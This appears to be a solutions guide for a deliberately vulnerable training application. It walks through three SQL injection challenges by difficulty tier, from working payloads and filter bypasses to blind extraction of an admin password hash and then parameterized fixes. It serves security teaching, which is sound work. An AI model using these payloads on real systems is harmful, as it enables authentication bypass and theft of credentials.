# SQL Injection

OWASP: https://owasp.org/Top10/2025/A05\_2025-Injection/
CWE: CWE-89

SQL injection occurs when user input is concatenated into SQL queries without parameterization. The application executes attacker-controlled SQL, allowing data exfiltration, authentication bypass, and in some cases remote code execution.

\---

## SELECT \* FROM Funding (`sqli\_search`)

**Difficulty:** Intern
**CWE:** CWE-89
**Route:** `GET /challenges/sqli?query=<search\_term>`

### Intern Tier

**Vulnerability:** The search query uses raw f-string interpolation to build a SQL statement. User input is placed directly inside a `LIKE` clause with no sanitization or parameterization.

```sql
SELECT id, name, description, price FROM products WHERE name LIKE '%{query}%' OR description LIKE '%{query}%'
```

**Exploit:**

1. Navigate to `/challenges/sqli`
2. Enter the following in the search box:

```
' OR 1=1 --
```

3. The resulting query becomes:

```sql
SELECT id, name, description, price FROM products WHERE name LIKE '%' OR 1=1 --%' OR description LIKE '%' OR 1=1 --%'
```

4. All products are returned because `1=1` is always true. The `--` comments out the remainder of the query.

**Solve condition:** The challenge solves when the query returns more than 4 results and the query string is non-empty.

**Why it works:** The single quote breaks out of the string literal context. The `OR 1=1` makes the WHERE clause universally true. The comment sequence `--` neutralizes the trailing quote and second LIKE clause.

### Junior Tier

**What changed:** The handler checks input against a keyword blacklist before executing the query. The blacklist blocks common SQL keywords in exact case: `or `, `OR `, `and `, `AND `, `union `, `UNION `, `select `, `SELECT `, `drop `, `DROP `, `insert `, `INSERT `, `update `, `UPDATE `, `delete `, `DELETE `. If any blocked string is found, the query is rejected.

**Bypass:** The blacklist only matches exact case. Mixed case variants like `Or`, `oR`, `And`, `uNION` are not blocked. SQL comments splitting keywords (`o/**/r`) also bypass the check.

**Exploit:**

```
' Or 1=1 --
```

The blacklist checks for `or ` (lowercase) and `OR ` (uppercase) but not `Or `. The mixed-case keyword passes the filter, and the underlying query is still built via f-string interpolation, so the injection works identically to the intern tier.

### Senior Tier

**What changed:** The main search query uses SQLAlchemy ORM with `ilike()` for safe parameterization. The sort parameter is validated against an allowlist of column names (`name`, `price`, `id`).

**Bypass:** The sort parameter accepts CASE expressions that can embed subqueries. While direct column injection is blocked, complex ORDER BY expressions slip through.

**Exploit:**

```
GET /challenges/sqli?query=test\&sort=price,(CASE WHEN (SELECT unicode(substr(password\_hash,1,1)) FROM users WHERE username='admin')>48 THEN name ELSE price END)
```

This creates a boolean-based blind SQL injection through the ORDER BY clause. The CASE expression executes a subquery that leaks data one character at a time by changing the sort order based on conditional logic.

### Tech Lead Tier

**Defense:** Full ORM parameterization with `ilike()`. Sort column validated with a strict allowlist and resolved via `getattr(Product, sort)`, never interpolated into SQL. Input length capped at 100 characters. No raw SQL anywhere in the handler.

**Why it works:** Parameterized queries ensure user input is always treated as data, never as SQL syntax. The ORM handles all escaping internally. The sort allowlist prevents ORDER BY injection. This addresses CWE-89 through prepared statements and input validation.

\---

## Bobby Tables Gets Hired (`sqli\_login`)

**Difficulty:** Junior
**CWE:** CWE-89
**Route:** `POST /login` (username field)

### Intern Tier

**Vulnerability:** The login query uses raw f-string interpolation with the username placed directly into a WHERE clause.

```sql
SELECT id, username, role FROM users WHERE username = '{username}' AND password\_hash = '{md5(password)}'
```

**Exploit:**

1. Navigate to the login page
2. Enter the following username:

```
admin' OR '1'='1' --
```

3. Enter any password
4. The query becomes:

```sql
SELECT id, username, role FROM users WHERE username = 'admin' OR '1'='1' --' AND password\_hash = '...'
```

5. The `OR '1'='1'` makes the condition always true. The `--` comments out the password check. You are logged in as admin.

**Solve condition:** The challenge solves when the username contains SQL injection indicators such as `' OR `, `' --`, or `UNION `.

### Junior Tier

**What changed:** The handler checks both the username and password against a keyword blacklist that includes all search blacklist entries plus `--` and `;`. This blocks the simple `admin' --` comment-out attack.

**Bypass:** The blacklist blocks `--` and `;` but not SQL block comments (`/* */`). Mixed case keywords also bypass the filter. The underlying query still uses f-string interpolation.

**Exploit:**

```
admin'/*
```

Enter `admin'/*` as the username with any password. The single quote closes the string literal, and `/*` opens a block comment that comments out the rest of the query (the `AND password_hash = '...'` clause). The blacklist does not check for `/*`.

### Senior Tier

**What changed:** Parameterized ORM query using `db.query(User).filter(User.username == username).first()`. No raw SQL.

**Bypass:** Not possible. The ORM handles parameterization correctly.

### Tech Lead Tier

**Defense:** Parameterized ORM query with bcrypt password verification. The username is never interpolated into SQL. Password comparison uses constant-time comparison via bcrypt's built-in verify function.

**Why it works:** ORM parameterization prevents injection. Bcrypt provides proper password hashing with salt, addressing both CWE-89 (injection) and CWE-916 (weak password hashing).

\---

## The Billion Dollar Pivot (`sqli\_blind`)

**Difficulty:** Senior
**CWE:** CWE-89
**Route:** `GET /challenges/sqli/check-username?username=<value>`

### Intern Tier

**Vulnerability:** The username check uses raw f-string interpolation in a COUNT query.

```sql
SELECT COUNT(\*) FROM users WHERE username = '{username}'
```

**Exploit:**

1. Send a request to the username check endpoint:

```
GET /challenges/sqli/check-username?username=' OR 1=1 --
```

2. The query becomes:

```sql
SELECT COUNT(\*) FROM users WHERE username = '' OR 1=1 --'
```

3. The response indicates the username "exists" because `OR 1=1` matches all rows.

**Solve condition:** The challenge solves when the username parameter matches the regex pattern `'\\s\*(OR|AND)\\s+` (a quote followed by OR or AND with spaces).

**Why it works:** This is boolean-based blind SQL injection. The attacker cannot see query results directly, but the application's yes/no response reveals whether the injected condition was true or false. By iterating with conditions like `AND (SELECT substr(password\_hash,1,1) FROM users WHERE username='admin')='a'`, an attacker can extract data one character at a time.

### Junior Tier

**What changed:** The handler checks input against the same keyword blacklist as the search challenge. Exact-case SQL keywords are blocked.

**Bypass:** Mixed case bypasses the blacklist. The underlying query still uses f-string interpolation.

**Exploit:**

```
GET /challenges/sqli/check-username?username=' Or 1=1 --
```

### Senior Tier

**What changed:** Fully parameterized query using named parameters: `text("SELECT COUNT(\*) FROM users WHERE username = :uname")` with `{"uname": username}`.

**Bypass:** Not possible. Named parameters prevent injection entirely.

### Tech Lead Tier

**Defense:** Same parameterized query as senior tier. Input validation and length limits applied as additional defense-in-depth.

**Why it works:** Parameterized queries with named bind variables ensure the database engine treats input as literal values. CWE-89 is fully mitigated.

